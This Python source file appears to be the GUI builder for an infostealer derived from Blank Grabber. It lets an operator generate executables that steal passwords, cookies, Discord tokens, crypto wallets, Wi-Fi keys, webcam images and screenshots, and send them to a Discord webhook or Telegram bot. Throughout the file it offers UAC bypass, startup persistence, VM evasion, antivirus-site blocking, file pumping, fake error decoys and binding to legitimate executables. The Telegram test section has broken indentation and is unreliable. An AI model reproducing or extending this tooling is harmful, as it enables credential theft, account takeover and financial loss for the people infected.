            text_color=DEFAULT_ACCENT_COLOR
        )
        output_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        # Build mode
        build_mode_frame = ctk.CTkFrame(output_frame, fg_color="transparent")
        build_mode_frame.pack(fill="x", padx=15, pady=(0, 5))
        
        build_mode_label = ctk.CTkLabel(
            build_mode_frame,
            text="Build Mode:",
            font=("Segoe UI", 12),
            width=100,
            anchor="w"
        )
        build_mode_label.pack(side="left")
        
        # Radio buttons for build mode
        self.build_mode_var = ctk.StringVar(value="exe")
        
        self.exe_radio = ctk.CTkRadioButton(
            build_mode_frame,
            text="EXE File",
            variable=self.build_mode_var,
            value="exe",
            command=self.buildModeButtonControl_Callback,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.exe_radio.pack(side="left", padx=(10, 20))
        
        self.py_radio = ctk.CTkRadioButton(
            build_mode_frame,
            text="Python File",
            variable=self.build_mode_var,
            value="py",
            command=self.buildModeButtonControl_Callback,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.py_radio.pack(side="left")
        
        # Console mode
        console_mode_frame = ctk.CTkFrame(output_frame, fg_color="transparent")
        console_mode_frame.pack(fill="x", padx=15, pady=(5, 15))
        
        console_mode_label = ctk.CTkLabel(
            console_mode_frame,
            text="Console Mode:",
            font=("Segoe UI", 12),
            width=100,
            anchor="w"
        )
        console_mode_label.pack(side="left")
        
        # Radio buttons for console mode
        self.console_mode_var = ctk.IntVar(value=0)
        
        self.console_none_radio = ctk.CTkRadioButton(
            console_mode_frame,
            text="Hidden",
            variable=self.console_mode_var,
            value=0,
            command=self.consoleModeButtonControl_Callback,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.console_none_radio.pack(side="left", padx=(10, 15))
        
        self.console_force_radio = ctk.CTkRadioButton(
            console_mode_frame,
            text="Visible",
            variable=self.console_mode_var,
            value=1,
            command=self.consoleModeButtonControl_Callback,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.console_force_radio.pack(side="left", padx=(0, 15))
        
        self.console_debug_radio = ctk.CTkRadioButton(
            console_mode_frame,
            text="Debug",
            variable=self.console_mode_var,
            value=2,
            command=self.consoleModeButtonControl_Callback,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.console_debug_radio.pack(side="left")
        
        # Icon & File Binding
        extras_frame = HexaFrame(build_frame, fg_color="#252538")
        extras_frame.pack(fill="x", pady=(0, 10))
        
        extras_title = ctk.CTkLabel(
            extras_frame,
            text="Extras",
            font=("Segoe UI", 14, "bold"),
            text_color=DEFAULT_ACCENT_COLOR
        )
        extras_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        # Icon selection
        icon_frame = ctk.CTkFrame(extras_frame, fg_color="transparent")
        icon_frame.pack(fill="x", padx=15, pady=(0, 10))
        
        icon_label = ctk.CTkLabel(
            icon_frame,
            text="Custom Icon:",
            font=("Segoe UI", 12),
            width=100,
            anchor="w"
        )
        icon_label.pack(side="left")
        
        self.icon_path_var = ctk.StringVar(value="No icon selected")
        self.icon_path_label = ctk.CTkLabel(
            icon_frame,
            textvariable=self.icon_path_var,
            font=("Segoe UI", 12),
            anchor="w",
            width=200
        )
        self.icon_path_label.pack(side="left", padx=(5, 10), fill="x", expand=True)
        
        self.selectIconButtonControl = HexaButton(
            icon_frame,
            text="Select Icon",
            command=self.selectIconButtonControl_Callback,
            width=120,
            height=30,
            fg_color="#444455"
        )
        self.selectIconButtonControl.pack(side="right")
        
        # File binding
        bind_frame = ctk.CTkFrame(extras_frame, fg_color="transparent")
        bind_frame.pack(fill="x", padx=15, pady=(0, 15))
        
        bind_label = ctk.CTkLabel(
            bind_frame,
            text="Bind File:",
            font=("Segoe UI", 12),
            width=100,
            anchor="w"
        )
        bind_label.pack(side="left")
        
        self.bind_path_var = ctk.StringVar(value="No file selected")
        self.bind_path_label = ctk.CTkLabel(
            bind_frame,
            textvariable=self.bind_path_var,
            font=("Segoe UI", 12),
            anchor="w",
            width=200
        )
        self.bind_path_label.pack(side="left", padx=(5, 10), fill="x", expand=True)
        
        self.bindExeButtonControl = HexaButton(
            bind_frame,
            text="Select File",
            command=self.bindExeButtonControl_Callback,
            width=120,
            height=30,
            fg_color="#444455"
        )
        self.bindExeButtonControl.pack(side="right")
        
        # Build info
        info_frame = HexaFrame(build_frame, fg_color="#252538")
        info_frame.pack(fill="x", pady=(0, 10))
        
        info_title = ctk.CTkLabel(
            info_frame,
            text="Build Information",
            font=("Segoe UI", 14, "bold"),
            text_color=DEFAULT_ACCENT_COLOR
        )
        info_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        info_text = ctk.CTkTextbox(
            info_frame,
            height=100,
            font=("Segoe UI", 12),
            fg_color="#333344",
            text_color="#CCCCCC",
            border_width=0
        )
        info_text.pack(fill="x", padx=15, pady=(0, 15))
        info_text.insert("1.0", "• Built files will be saved to the 'dist' folder\n")
        info_text.insert("end", "• Python files can be run directly with Python 3.10+\n")
        info_text.insert("end", "• EXE files are standalone and don't require Python\n")
        info_text.insert("end", "• Some features require administrator privileges to work properly")
        info_text.configure(state="disabled")

    def C2ModeButtonControl_Callback(self) -> None:
        """Handle C2 mode selection changes"""
        if self.c2_mode_var.get() == 0:  # Discord mode
            self.C2Mode = 0
            self.c2_url_label.configure(text="Webhook URL:")
            self.C2EntryControl.configure(placeholder_text="Enter Discord webhook URL here")
            self.testC2ButtonControl.configure(text="Test Webhook")
            
            # Enable Discord-only features
            self.pingMeCheckboxControl.configure(state="normal")
            self.discordInjectionCheckboxControl.configure(state="normal")
        else:  # Telegram mode
            self.C2Mode = 1
            self.c2_url_label.configure(text="Bot Config:")
            self.C2EntryControl.configure(placeholder_text="Enter [Telegram Bot Token]$[Chat ID]")
            self.testC2ButtonControl.configure(text="Test Endpoint")
            
            # Disable Discord-only features
            self.pingMeCheckboxControl.configure(state="disabled")
            self.discordInjectionCheckboxControl.configure(state="disabled")
            self.pingMeVar.set(False)
            self.discordInjectionVar.set(False)

    def bindExeButtonControl_Callback(self) -> None:
        """Handle executable binding selection"""
        UNBIND = "Remove Bound File"
        BIND = "Select File"

        buttonText = self.bindExeButtonControl.cget("text")

        if buttonText == BIND:
            allowedFiletypes = (("Executable file", "*.exe"),)
            filePath = filedialog.askopenfilename(
                title="Select file to bind",
                initialdir=".",
                filetypes=allowedFiletypes
            )
            
            if filePath and os.path.isfile(filePath):
                self.boundExePath = filePath
                self.bindExeButtonControl.configure(text=UNBIND)
                self.bind_path_var.set(os.path.basename(filePath))
                
                if messagebox.askyesno(APPLICATION_NAME, "Do you want this bound executable to run on startup as well?\n(Only works if 'Add to Startup' option is enabled)"):
                    self.boundExeRunOnStartup = True
        
        elif buttonText == UNBIND:
            self.boundExePath = ""
            self.boundExeRunOnStartup = False
            self.bindExeButtonControl.configure(text=BIND)
            self.bind_path_var.set("No file selected")

    def selectIconButtonControl_Callback(self) -> None:
        """Handle icon selection for the executable"""
        UNSELECT = "Remove Icon"
        SELECT = "Select Icon"

        buttonText = self.selectIconButtonControl.cget("text")

        if buttonText == SELECT:
            allowedFiletypes = (
                ("Icon", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"]), 
                ("Any file", "*")
            )
            
            filePath = filedialog.askopenfilename(
                title="Select icon",
                initialdir=".",
                filetypes=allowedFiletypes
            )
            
            if filePath and os.path.isfile(filePath):
                try:
                    from io import BytesIO
                    buffer = BytesIO()
                    with Image.open(filePath) as image:
                        image.save(buffer, format="ico")
                    
                    self.iconBytes = buffer.getvalue()
                    self.selectIconButtonControl.configure(text=UNSELECT)
                    self.icon_path_var.set(os.path.basename(filePath))
                except Exception:
                    messagebox.showerror(APPLICATION_NAME, "Unable to convert the image to icon!")
        
        elif buttonText == UNSELECT:
            self.iconBytes = b""
            self.selectIconButtonControl.configure(text=SELECT)
            self.icon_path_var.set("No icon selected")

    def buildModeButtonControl_Callback(self) -> None:
        """Handle build mode selection changes"""
        EXEMODE = "exe"
        PYMODE = "py"

        exeOnlyControls = [
            self.fakeErrorCheckboxControl,
            self.startupCheckboxControl,
            self.uacBypassCheckboxControl,
            self.pumpStubCheckboxControl,
            self.bindExeButtonControl,
            self.selectIconButtonControl
        ]

        if self.build_mode_var.get() == PYMODE:
            # Disable EXE-only options
            self.OutputAsExe = False
            for control in exeOnlyControls:
                control.configure(state="disabled")
                
            # Reset some variables
            self.fakeErrorVar.set(False)
            self.fakeErrorData = [False, ("", "", 0)]
            
            if self.iconBytes:
                self.selectIconButtonControl_Callback()  # Remove icon
            
            if self.boundExePath:
                self.bindExeButtonControl_Callback()  # Remove bound executable
        else:
            # Enable EXE-only options
            self.OutputAsExe = True
            for control in exeOnlyControls:
                control.configure(state="normal")

    def consoleModeButtonControl_Callback(self) -> None:
        """Handle console mode selection changes"""
        self.ConsoleMode = self.console_mode_var.get()

    def testC2ButtonControl_Callback(self) -> None:
        """Test the C2 (Command & Control) connection"""
        self.C2EntryControl.configure(state="disabled")
        self.testC2ButtonControl.configure(state="disabled")
        self.buildButtonControl.configure(state="disabled")

        def check():
            if self.c2_mode_var.get() == 0:  # Discord mode
                webhook = self.C2EntryControl.get().strip()
                if not webhook:
                    messagebox.showerror(APPLICATION_NAME, "Webhook URL cannot be empty!")
                    return
                
                if any(char.isspace() for char in webhook):
                    messagebox.showerror(APPLICATION_NAME, "Webhook URL cannot contain spaces!")
                    return
                
                if not webhook.startswith(("http://", "https://")):
                    messagebox.showerror(APPLICATION_NAME, "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
                    return
                
                if not "discord" in webhook:
                    messagebox.showwarning(APPLICATION_NAME, "URL does not appear to be a Discord webhook!")
                    return
                
                if not Utility.CheckInternetConnection():
                    messagebox.showwarning(APPLICATION_NAME, "Unable to connect to the internet!")
                    return
                
                try:
                    from urllib.request import Request, urlopen
                    from urllib.error import URLError
                    import json
                    
                    data = json.dumps({"content": "Your webhook is working!"}).encode()
                    headers = {
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0"
                    }
                    req = Request(webhook, data=data, headers=headers, method="POST")
                    
                    with urlopen(req) as response:
                        if response.status == 204:
                            messagebox.showinfo(APPLICATION_NAME, "Your webhook is working correctly!")
                        else:
                            messagebox.showwarning(APPLICATION_NAME, f"Unexpected response from Discord: {response.status}")
                except URLError:
                    messagebox.showerror(APPLICATION_NAME, "Failed to connect to the webhook!")
                except Exception as e:
                    messagebox.showerror(APPLICATION_NAME, f"An error occurred: {str(e)}")
            
            else:  # Telegram mode
                endpoint = self.C2EntryControl.get().strip()
                if not endpoint:
                    messagebox.showerror(APPLICATION_NAME, "Endpoint cannot be empty!")
                    return
                
                if any(char.isspace() for char in endpoint):
                    messagebox.showerror(APPLICATION_NAME, "Endpoint cannot contain spaces!")
                    return
                
                if any(char in ("[", "]") for char in endpoint):
                    messagebox.showerror(APPLICATION_NAME, "You do not have to include brackets in the endpoint!")
                    return
                
                if not endpoint.count("$") == 1:
                    messagebox.showerror(APPLICATION_NAME, "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.")
                    return
                
                token, chat_id = [i.strip() for i in endpoint.split("$")]
                
                if not token:
                    messagebox.showerror(APPLICATION_NAME, "Bot token cannot be empty!")
                    return
                
                if not chat_id:
                    messagebox.showerror(APPLICATION_NAME, "Chat ID cannot be empty!")
                    return
                
                if chat_id and not (chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1):
                    messagebox.showerror(APPLICATION_NAME, "Invalid chat ID! Chat ID must be a number.")
                    return
                
                if not Utility.CheckInternetConnection():
                    messagebox.showwarning(APPLICATION_NAME, "Unable to connect to the internet!")
                    return
                
               try:
    from urllib.request import Request, urlopen
    from urllib.error import URLError
    import json
    
    # Test bot token validity
    req = Request(f"https://api.telegram.org/bot{token}/getMe", method="GET")
    req.add_header("User-Agent", "Mozilla/5.0")
    
    with urlopen(req) as response:
        result = json.loads(response.read().decode())
        if not result.get("ok"):
            messagebox.showerror(APPLICATION_NAME, "Invalid bot token!")
            return
                    
                    # Test sending a message
                    test_message = urllib.parse.quote("Your endpoint is working!")
                    req = Request(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={test_message}", method="GET")
                    req.add_header("User-Agent", "Mozilla/5.0")
                    
                    with urlopen(req) as response:
                        result = json.loads(response.read().decode())
                        if result.get("ok"):
                            messagebox.showinfo(APPLICATION_NAME, "Your endpoint is working correctly!")
                        else:
                            error_desc = result.get("description", "Unknown error")
                            messagebox.showerror(APPLICATION_NAME, f"Error: {error_desc}")
                            
                except URLError:
                    messagebox.showerror(APPLICATION_NAME, "Failed to connect to the Telegram API!")
                except Exception as e:
                    messagebox.showerror(APPLICATION_NAME, f"An error occurred: {str(e)}")
            
            # Re-enable UI elements regardless of success/failure
            self.C2EntryControl.configure(state="normal")
            self.testC2ButtonControl.configure(state="normal")
            self.buildButtonControl.configure(state="normal")
        
        # Run the check in a separate thread to keep UI responsive
        threading.Thread(target=check, daemon=True).start()

    def fakeError_Event(self) -> None:
        """Open fake error settings dialog"""
        if not self.fakeErrorVar.get():
            self.fakeErrorData = [False, ("", "", 0)]
            return
        
        fake_error_builder = FakeErrorBuilder(self.master)
        self.wait_window(fake_error_builder)
        # The FakeErrorBuilder will update fakeErrorData directly

    def pumpStub_Event(self) -> None:
        """Open file pumper settings dialog"""
        if not self.pumpStubVar.get():
            self.pumpLimit = 0
            return
            
        pumper_settings = PumperSettings(self.master)
        self.wait_window(pumper_settings)
        self.pumpStubVar.set(pumper_settings.limit > 0)
        self.pumpLimit = pumper_settings.limit * 1024 * 1024  # Convert to bytes

    def buildButtonControl_Callback(self) -> None:
        """Handle the build process when the Build button is clicked"""
        # Validate C2 configuration
        if self.c2_mode_var.get() == 0:  # Discord mode
            webhook = self.C2EntryControl.get().strip()
            if len(webhook) == 0:
                messagebox.showerror(APPLICATION_NAME, "Webhook URL cannot be empty!")
                return
            
            if any(char.isspace() for char in webhook):
                messagebox.showerror(APPLICATION_NAME, "Webhook URL cannot contain spaces!")
                return
            
            if not webhook.startswith(("http://", "https://")):
                messagebox.showerror(APPLICATION_NAME, "Invalid protocol for webhook URL! It must start with either 'http://' or 'https://'.")
                return
        
        elif self.c2_mode_var.get() == 1:  # Telegram mode
            endpoint = self.C2EntryControl.get().strip()
            if len(endpoint) == 0:
                messagebox.showerror(APPLICATION_NAME, "Endpoint cannot be empty!")
                return

            if any(char.isspace() for char in endpoint):
                messagebox.showerror(APPLICATION_NAME, "Endpoint cannot contain spaces!")
                return
            
            if any(char in ("[", "]") for char in endpoint):
                messagebox.showerror(APPLICATION_NAME, "You do not have to include brackets in the endpoint!")
                return

            if not endpoint.count("$") == 1:
                messagebox.showerror(APPLICATION_NAME, "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.")
                return
            
            token, chat_id = [i.strip() for i in endpoint.split("$")]

            if not token:
                messagebox.showerror(APPLICATION_NAME, "Bot token cannot be empty!")
                return
            
            if chat_id:
                if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
                    messagebox.showerror(APPLICATION_NAME, "Invalid chat ID! Chat ID must be a number.")
                    return
            else:
                messagebox.showerror(APPLICATION_NAME, "Chat ID cannot be empty!")
                return
        
        # Check internet connection
        if not Utility.CheckInternetConnection():
            if not messagebox.askyesno(APPLICATION_NAME, "Unable to connect to the internet! Continue anyway?"):
                return
        
        # Verify that at least one collection module is enabled
        if not any([
            self.captureWebcamVar.get(), 
            self.capturePasswordsVar.get(), 
            self.captureCookiesVar.get(), 
            self.captureHistoryVar.get(), 
            self.captureDiscordTokensVar.get(), 
            self.captureGamesVar.get(), 
            self.captureWalletsVar.get(), 
            self.captureWifiPasswordsVar.get(), 
            self.captureSystemInfoVar.get(), 
            self.captureScreenshotVar.get(), 
            self.captureTelegramVar.get(), 
            self.captureCommonFilesVar.get(),
            self.captureAutofillsVar.get()
        ]):
            messagebox.showwarning(APPLICATION_NAME, "You must select at least one of the data collection modules!")
            return
        
        # Prepare configuration
        config = {
            "settings": {
                "c2": [self.c2_mode_var.get(), self.C2EntryControl.get().strip()],
                "mutex": "".join(random.choices(string.ascii_letters + string.digits, k=16)),
                "pingme": self.pingMeVar.get(),
                "vmprotect": self.vmProtectVar.get(),
                "startup": self.startupVar.get(),
                "melt": self.meltVar.get(),
                "uacBypass": self.uacBypassVar.get(),
                "archivePassword": Settings.Password,
                "consoleMode": self.console_mode_var.get(),
                "debug": self.console_mode_var.get() == 2,
                "pumpedStubSize": self.pumpLimit,
                "boundFileRunOnStartup": self.boundExeRunOnStartup,
            },
            
            "modules": {
                "captureWebcam": self.captureWebcamVar.get(),
                "capturePasswords": self.capturePasswordsVar.get(),
                "captureCookies": self.captureCookiesVar.get(),
                "captureHistory": self.captureHistoryVar.get(),
                "captureAutofills": self.captureAutofillsVar.get(),
                "captureDiscordTokens": self.captureDiscordTokensVar.get(),
                "captureGames": self.captureGamesVar.get(),
                "captureWifiPasswords": self.captureWifiPasswordsVar.get(),
                "captureSystemInfo": self.captureSystemInfoVar.get(),
                "captureScreenshot": self.captureScreenshotVar.get(),
                "captureTelegramSession": self.captureTelegramVar.get(),
                "captureCommonFiles": self.captureCommonFilesVar.get(),
                "captureWallets": self.captureWalletsVar.get(),

                "fakeError": self.fakeErrorData,
                "blockAvSites": self.blockAvSitesVar.get(),
                "discordInjection": self.discordInjectionVar.get()
            }
        }

        configData = json.dumps(config, indent=4)

        # Start build process
        if self.build_mode_var.get() == "exe":
            self.master.BuildExecutable(configData, self.iconBytes, self.boundExePath)
        else:
            self.master.BuildPythonFile(configData)


class Builder(ctk.CTk):
    """Main application window class"""
    def __init__(self) -> None:
        super().__init__()
        
        # Set appearance
        ctk.set_appearance_mode("dark")
        
        # Configure window
        self.title(f"{APPLICATION_NAME} {APPLICATION_VERSION} - Next-Gen Builder")
        try:
            self.iconbitmap(os.path.join("Extras", "icon.ico"))
        except:
            pass  # If icon file doesn't exist, use default
            
        self.geometry("1050x700")
        self.minsize(900, 650)
        self.resizable(True, True)
        
        # Create gradient background frame
        self.bg_frame = ctk.CTkFrame(self, fg_color=BACKGROUND_COLOR, corner_radius=0)
        self.bg_frame.place(relx=0, rely=0, relwidth=1, relheight=1)
        
        # Configure grid
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=0)  # Header
        self.grid_rowconfigure(1, weight=1)  # Content
        
        # Create header
        self._create_header()
        
        # Create main content
        self._create_content()

    def _create_header(self):
        """Create the application header"""
        header_frame = ctk.CTkFrame(self, fg_color="#131320", height=80, corner_radius=0)
        header_frame.grid(row=0, column=0, sticky="ew")
        header_frame.grid_propagate(False)
        header_frame.grid_columnconfigure(0, weight=1)
        header_frame.grid_columnconfigure(1, weight=0)
        
        # Logo and title
        logo_frame = ctk.CTkFrame(header_frame, fg_color="transparent")
        logo_frame.grid(row=0, column=0, sticky="w", padx=20)
        
        app_title = ctk.CTkLabel(
            logo_frame,
            text=APPLICATION_NAME,
            font=("Segoe UI", 28, "bold"),
            text_color=DEFAULT_ACCENT_COLOR
        )
        app_title.pack(side="left", padx=(0, 5))
        
        app_version = ctk.CTkLabel(
            logo_frame,
            text=APPLICATION_VERSION,
            font=("Segoe UI", 14),
            text_color="#AAAAAA"
        )
        app_version.pack(side="left", padx=(0, 10), pady=(8, 0))
        
        app_subtitle = ctk.CTkLabel(
            logo_frame,
            text="Advanced Data Collector",
            font=("Segoe UI", 14),
            text_color="#DDDDDD"
        )
        app_subtitle.pack(side="left", pady=(8, 0))
        
        # Header controls
        controls_frame = ctk.CTkFrame(header_frame, fg_color="transparent")
        controls_frame.grid(row=0, column=1, sticky="e", padx=20)
        
        def open_github():
            webbrowser.open("https://github.com/tuffycodes/Blank")
        
        github_btn = HexaButton(
            controls_frame,
            text="GitHub",
            command=open_github,
            width=90,
            height=32,
            fg_color="#444455",
            hover_color="#555566"
        )
        github_btn.pack(side="left", padx=(0, 10))
        
        def open_about():
            messagebox.showinfo(
                f"About {APPLICATION_NAME}",
                f"{APPLICATION_NAME} {APPLICATION_VERSION}\n\n"
                "An advanced data collection toolkit with modern interface.\n\n"
                "Based on Blank Grabber with UI redesign by tuffycodes."
            )
        
        about_btn = HexaButton(
            controls_frame,
            text="About",
            command=open_about,
            width=90,
            height=32,
            fg_color="#444455",
            hover_color="#555566"
        )
        about_btn.pack(side="left")

    def _create_content(self):
        """Create the main content area"""
        content_frame = ctk.CTkFrame(self, fg_color="transparent")
        content_frame.grid(row=1, column=0, sticky="nsew", padx=0, pady=0)
        content_frame.grid_columnconfigure(0, weight=1)
        content_frame.grid_rowconfigure(0, weight=1)
        
        # Create builder options frame
        self.builderOptions = BuilderOptionsFrame(content_frame)
        self.builderOptions.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)

    def BuildPythonFile(self, config: str) -> None:
        """Build a Python script file with the specified configuration"""
        outPath = filedialog.asksaveasfilename(
            title="Save Python File",
            confirmoverwrite=True, 
            filetypes=[("Python Script", ["*.py","*.pyw"])], 
            initialfile="hexa" + (".py" if json.loads(config)["settings"]["consoleMode"] == 2 else ".pyw"),
            defaultextension=".pyw"
        )
        
        if not outPath or not os.path.isdir(os.path.dirname(outPath)):
            return
        
        # Show processing dialog
        processing_window = ctk.CTkToplevel(self)
        processing_window.title("Building Python File")
        processing_window.geometry("400x150")
        processing_window.transient(self)
        processing_window.grab_set()
        processing_window.resizable(False, False)
        
        # Center the window
        processing_window.update_idletasks()
        x = self.winfo_rootx() + (self.winfo_width() - processing_window.winfo_width()) // 2
        y = self.winfo_rooty() + (self.winfo_height() - processing_window.winfo_height()) // 2
        processing_window.geometry(f"+{x}+{y}")
        
        progress_label = ctk.CTkLabel(
            processing_window,
            text="Creating Python file...",
            font=("Segoe UI", 14)
        )
        progress_label.pack(pady=(20, 10))
        
        progress_bar = ctk.CTkProgressBar(
            processing_window,
            width=350,
            height=20,
            corner_radius=5,
            mode="indeterminate"
        )
        progress_bar.pack(pady=(0, 20))
        progress_bar.start()
        
        def build_process():
            try:
                with open(os.path.join(os.path.dirname(__file__), "Components", "stub.py")) as file:
                    code = file.read()
                
                sys.path.append(os.path.join(os.path.dirname(__file__), "Components"))
                
                # Clean pycache
                if os.path.isdir(os.path.join(os.path.dirname(__file__), "Components", "__pycache__")):
                    try:
                        shutil.rmtree(os.path.join(os.path.dirname(__file__), "Components", "__pycache__"))
                    except Exception:
                        pass
                        
                # Process code with configuration
                from Components import process
                _, injection = process.ReadSettings()
                code = process.WriteSettings(code, json.loads(config), injection)
                
                if os.path.isfile(outPath):
                    os.remove(outPath)
                
                try: 
                    code = ast.unparse(ast.parse(code))  # Removes comments
                except Exception: 
                    pass
                
                code = "# Modern Python Data Collector by Hexa\n# Required: pip install pyaesm urllib3\n\n" + code
                
                with open(outPath, "w") as file:
                    file.write(code)
                
                # Update UI in main thread
                self.after(0, lambda: [
                    processing_window.destroy(),
                    messagebox.showinfo(APPLICATION_NAME, f"Python file created successfully!\nSaved to: {outPath}")
                ])
                
            except Exception as e:
                # Update UI in main thread
                self.after(0, lambda: [
                    processing_window.destroy(),
                    messagebox.showerror(APPLICATION_NAME, f"Error creating Python file: {str(e)}")
                ])
        
        # Start build process in a separate thread
        threading.Thread(target=build_process, daemon=True).start()

    def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
        """Build an executable with the specified configuration"""
        # Show processing dialog
        processing_window = ctk.CTkToplevel(self)
        processing_window.title("Building Executable")
        processing_window.geometry("500x300")
        processing_window.transient(self)
        processing_window.grab_set()
        processing_window.resizable(False, False)
        
        # Center the window
        processing_window.update_idletasks()
        x = self.winfo_rootx() + (self.winfo_width() - processing_window.winfo_width()) // 2
        y = self.winfo_rooty() + (self.winfo_height() - processing_window.winfo_height()) // 2
        processing_window.geometry(f"+{x}+{y}")
        
        # Add a console output frame
        output_frame = ctk.CTkFrame(processing_window, fg_color="#1A1A2E")
        output_frame.pack(fill="both", expand=True, padx=20, pady=(20, 10))
        
        output_text = ctk.CTkTextbox(
            output_frame,
            font=("Consolas", 12),
            fg_color="#252538",
            text_color="#00FF00",
            border_width=0
        )
        output_text.pack(fill="both", expand=True, padx=10, pady=10)
        
        progress_bar = ctk.CTkProgressBar(
            processing_window,
            width=460,
            height=15,
            corner_radius=5,
            mode="indeterminate"
        )
        progress_bar.pack(pady=(0, 20))
        progress_bar.start()
        
        # Function to update the output text
        def update_output(text):
            output_text.configure(state="normal")
            output_text.insert("end", text + "\n")
            output_text.see("end")
            output_text.configure(state="disabled")
        
        update_output("Starting build process...")
        
        def build_process():
            def exit_process(code=0):
                update_output(f"Build process exited with code {code}")
                progress_bar.stop()
                return code
            
            try:
                update_output("Creating virtual environment...")
                
                # Create virtual environment if it doesn't exist
                if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
                    if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
                        update_output("Creating virtual environment (this may take some time)...")
                        res = subprocess.run("python -m venv env", capture_output=True, shell=True)
                        if res.returncode != 0:
                            error_msg = f'Error creating virtual environment: {res.stderr.decode(errors="ignore")}'
                            update_output(error_msg)
                            exit_process(1)
                            raise Exception(error_msg)
                
                update_output("Copying assets to virtual environment...")
                for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Components")):
                    if os.path.isfile(fileloc := os.path.join(datadir, i)):
                        shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
                    else:
                        shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i), dirs_exist_ok=True)
                
                update_output("Writing configuration...")
                with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write(config)
                
                os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
                
                # Handle icon file
                if os.path.isfile("icon.ico"):
                    os.remove("icon.ico")
                
                if iconFileBytes:
                    update_output("Adding custom icon...")
                    with open("icon.ico", "wb") as file:
                        file.write(iconFileBytes)
                
                # Handle bound file
                if os.path.isfile("bound.exe"):
                    os.remove("bound.exe")
                
                if os.path.isfile(boundFilePath):
                    update_output("Adding bound executable...")
                    shutil.copy(boundFilePath, "bound.exe")
                
                update_output("Starting PyInstaller build process (this will take some time)...")
                process = subprocess.Popen("run.bat", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=1, universal_newlines=True)
                
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    if output:
                        update_output(output.strip())
                
                rc = process.poll()
                
                if rc == 0:
                    # Move the built file to a user-selected location
                    built_file = os.path.join(os.path.dirname(__file__), "env", "Scripts", "dist", "Built.exe")
                    if os.path.isfile(built_file):
                        save_path = filedialog.asksaveasfilename(
                            title="Save Executable File",
                            confirmoverwrite=True, 
                            filetypes=[("Executable", "*.exe")], 
                            initialfile="Hexa.exe",
                            defaultextension=".exe"
                        )
                        
                        if save_path:
                            try:
                                shutil.copy(built_file, save_path)
                                self.after(0, lambda: [
                                    processing_window.destroy(),
                                    messagebox.showinfo(APPLICATION_NAME, f"Executable built successfully!\nSaved to: {save_path}")
                                ])
                            except Exception as e:
                                self.after(0, lambda: [
                                    processing_window.destroy(),
                                    messagebox.showerror(APPLICATION_NAME, f"Error saving executable: {str(e)}")
                                ])
                        else:
                            self.after(0, processing_window.destroy)
                    else:
                        self.after(0, lambda: [
                            processing_window.destroy(),
                            messagebox.showerror(APPLICATION_NAME, "Build failed: Output file not found")
                        ])
                else:
                    self.after(0, lambda: [
                        processing_window.destroy(),
                        messagebox.showerror(APPLICATION_NAME, f"Build failed with exit code: {rc}")
                    ])
            
            except Exception as e:
                self.after(0, lambda: [
                    processing_window.destroy(),
                    messagebox.showerror(APPLICATION_NAME, f"Build process error: {str(e)}")
                ])
        
        # Start build process in a separate thread
        threading.Thread(target=build_process, daemon=True).start()


if __name__ == "__main__":
    try:
        if os.name == "nt":
            # Check for required components
            if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
                messagebox.showerror(
                    APPLICATION_NAME,
                    "Components folder not found. Please reinstall the application."
                )
                exit(1)
            
            # Check Python version
            version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
            if not (float(f"{sys.version_info.major}.{sys.version_info.minor}") >= 3.10):
                messagebox.showerror(
                    APPLICATION_NAME,
                    f"Your Python version is {version} but version 3.10+ is required.\n"
                    "Please update your Python installation."
                )
                exit(1)
                
            if "windowsapps" in sys.executable.lower():
                messagebox.showerror(
                    APPLICATION_NAME,
                    "It appears you installed Python from the Microsoft Store.\n"
                    "Please install Python from the official website: https://python.org/downloads"
                )
                exit(1)

            Utility.CheckConfiguration()
            
            if Utility.CheckForUpdates():
                response = messagebox.askyesno(
                    "Update Available", 
                    "A new version is available. It's recommended to update to the latest version.\n\n"
                    "Would you like to visit the download page now?"
                )
                if response:
                    webbrowser.open_new_tab("https://github.com/tuffycodes/Blank")
                    exit(0)
                
            if not Utility.IsAdmin():
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                exit(0)
            
            # Start the application
            app = Builder()
            app.mainloop()
        else:
            messagebox.showerror(APPLICATION_NAME, "Only Windows operating system is supported.")
    except Exception as e:
        # Log and display any unhandled exceptions
        error_msg = f"Fatal error: {str(e)}\n\n{traceback.format_exc()}"
        
        try:
            # Write to log file
            with open("error_log.txt", "a") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] FATAL ERROR\n{error_msg}\n\n")
        except:
